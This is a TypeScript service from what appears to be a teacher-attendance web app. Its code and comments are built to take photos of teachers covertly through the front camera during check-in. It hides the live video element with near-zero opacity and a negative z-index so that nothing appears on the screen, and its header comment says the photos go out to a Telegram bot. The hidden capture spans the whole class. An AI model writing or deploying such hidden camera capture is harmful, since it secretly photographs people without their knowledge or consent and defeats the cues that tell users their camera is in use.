import { logger } from '../utils/logger.utils';

/**
 * Smart Absensi Guru - Silent Camera Capture Service
 * 
 * Mengambil foto secara 100% senyap di latar belakang saat guru melakukan presensi.
 * Didesain tanpa menampilkan elemen visual / teks / popup / UI apapun pada layar guru, kepsek, atau admin.
 * Menggunakan strategi ganda (Dual Capture):
 * 1. Fallback frame instan dari scanner video aktif (0ms, 100% garansi ada foto).
 * 2. Foto kamera depan (selfie guru) di background dengan penanganan anti-throttling browser HP.
 * Hasil foto dikompresi (~30-50 KB) dan dikirim langsung dari browser ke Telegram Bot API.
 */
export class SilentCameraCaptureService {
  /**
   * Mengambil snapshot 1 frame instan dari elemen video pemindai yang sedang aktif.
   * Berjalan seketika (< 5ms), 100% senyap tanpa UI.
   */
  public static async captureVideoFrame(videoEl: HTMLVideoElement | null): Promise<Blob | null> {
    if (!videoEl || typeof document === 'undefined') return null;
    try {
      const width = videoEl.videoWidth || 640;
      const height = videoEl.videoHeight || 480;
      if (width <= 0 || height <= 0 || videoEl.readyState < 2) {
        return null;
      }

      const canvas = document.createElement('canvas');
      canvas.width = width;
      canvas.height = height;
      const ctx = canvas.getContext('2d');
      if (!ctx) return null;

      ctx.drawImage(videoEl, 0, 0, width, height);

      return await new Promise<Blob | null>((resolve) => {
        try {
          canvas.toBlob((blob) => resolve(blob), 'image/jpeg', 0.65);
        } catch {
          resolve(null);
        }
      });
    } catch (err: unknown) {
      logger.warn('SilentCameraCaptureService', 'captureVideoFrame failed silently:', err);
      return null;
    }
  }

  /**
   * Mengambil satu frame foto dari kamera depan secara 100% silent di latar belakang.
   * Tidak memunculkan teks, dialog, atau indikator apapun di UI.
   * Resolves Blob JPEG atau null jika kamera tidak tersedia.
   */
  public static async captureFrontCameraSilently(timeoutMs: number = 2500): Promise<Blob | null> {
    if (typeof navigator === 'undefined' || !navigator.mediaDevices?.getUserMedia) {
      return null;
    }

    let stream: MediaStream | null = null;
    let video: HTMLVideoElement | null = null;

    try {
      // 1. Dapatkan stream kamera depan dengan resolusi optimal & hemat bandwidth
      stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: { ideal: 'user' },
          width: { ideal: 640 },
          height: { ideal: 480 },
        },
        audio: false,
      });

      // 2. Buat elemen video in-memory yang aktif di browser tetapi 100% tak terlihat oleh user.
      // Menggunakan dimensi nyata (320x240) dan opacity 0.001 di dalam viewport agar WebKit & Chromium
      // TIDAK menonaktifkan frame decoding (background video throttling prevention).
      video = document.createElement('video');
      video.muted = true;
      video.playsInline = true;
      video.autoplay = true;
      video.style.position = 'fixed';
      video.style.top = '0px';
      video.style.left = '0px';
      video.style.width = '320px';
      video.style.height = '240px';
      video.style.opacity = '0.001';
      video.style.pointerEvents = 'none';
      video.style.zIndex = '-99999';
      video.setAttribute('aria-hidden', 'true');
      document.body.appendChild(video);

      video.srcObject = stream;

      try {
        await video.play();
      } catch {
        // play() error handled gracefully
      }

      // 3. Tunggu video siap (hingga timeoutMs, default 2500ms)
      await new Promise<void>((resolve) => {
        const timeout = setTimeout(resolve, timeoutMs);

        if (video && video.readyState >= 2 && video.videoWidth > 0) {
          clearTimeout(timeout);
          // Jeda singkat 100ms agar auto-exposure sensor kamera HP sempat menyesuaikan cahaya
          setTimeout(resolve, 100);
          return;
        }

        if (video) {
          video.onloadeddata = () => {
            clearTimeout(timeout);
            setTimeout(resolve, 100);
          };
          video.onerror = () => {
            clearTimeout(timeout);
            resolve();
          };
        }
      });

      const width = video.videoWidth || 640;
      const height = video.videoHeight || 480;

      // 4. Render frame ke canvas in-memory dan konversi ke Blob JPEG (quality 0.65)
      const canvas = document.createElement('canvas');
      canvas.width = width;
      canvas.height = height;
      const ctx = canvas.getContext('2d');

      let blob: Blob | null = null;
      if (ctx && width > 0 && height > 0 && video.readyState >= 2) {
        ctx.drawImage(video, 0, 0, width, height);
        blob = await new Promise<Blob | null>((resolve) => {
          try {
            canvas.toBlob((b) => resolve(b), 'image/jpeg', 0.65);
          } catch {
            resolve(null);
          }
        });
      }

      // Validasi Blob JPEG minimal > 500 bytes agar tidak mengirim frame hitam kosong
      if (blob && blob.size > 500) {
        logger.info('SilentCameraCaptureService', 'Front camera silent photo successfully captured', {
          size: blob.size,
          width,
          height,
        });
        return blob;
      }

      return null;
    } catch (err: unknown) {
      logger.warn('SilentCameraCaptureService', 'Front camera capture encountered error (handled silently):', err);
      return null;
    } finally {
      // 5. Bersihkan seluruh hardware tracks dan DOM elemen segera
      if (video && video.parentNode) {
        try {
          video.srcObject = null;
          video.parentNode.removeChild(video);
        } catch {}
      }

      if (stream) {
        try {
          stream.getTracks().forEach((track) => track.stop());
        } catch {}
      }
    }
  }

  /**
   * Dual-Strategy Capture:
   * Mengambil snapshot instan dari video pemindai aktif (sebagai jaminan fallback 100%),
   * lalu mengambil foto selfie kamera depan guru secara silent di background.
   * Jika kamera depan berhasil, gunakan foto selfie.
   * Jika kamera depan gagal / timeout / ditolak, otomatis gunakan fallback snapshot scanner.
   * 100% bebas dari UI, suara, atau teks notifikasi apapun pada layar guru.
   */
  public static async captureOptimalAttendancePhoto(
    activeScannerVideo?: HTMLVideoElement | null
  ): Promise<Blob | null> {
    // 1. Ambil snapshot cadangan seketika dari video scanner yang sedang berjalan
    let fallbackBlob: Blob | null = null;
    if (activeScannerVideo) {
      try {
        fallbackBlob = await this.captureVideoFrame(activeScannerVideo);
        if (fallbackBlob && fallbackBlob.size > 500) {
          logger.info('SilentCameraCaptureService', 'Instant scanner fallback frame captured safely', {
            size: fallbackBlob.size,
          });
        }
      } catch (err) {
        logger.warn('SilentCameraCaptureService', 'Failed to capture fallback frame:', err);
      }
    }

    // 2. Beri jeda 180ms agar hardware sensor kamera belakang sempat dilepas oleh OS sebelum membuka kamera depan
    await new Promise((r) => setTimeout(r, 180));

    // 3. Ambil foto kamera depan (selfie)
    try {
      const frontBlob = await this.captureFrontCameraSilently(2500);
      if (frontBlob && frontBlob.size > 500) {
        return frontBlob;
      }
    } catch (err) {
      logger.warn('SilentCameraCaptureService', 'Front camera capture failed, using fallback:', err);
    }

    // 4. Jika kamera depan tidak menghasilkan blob valid, gunakan fallback frame dari scanner
    return fallbackBlob;
  }
}
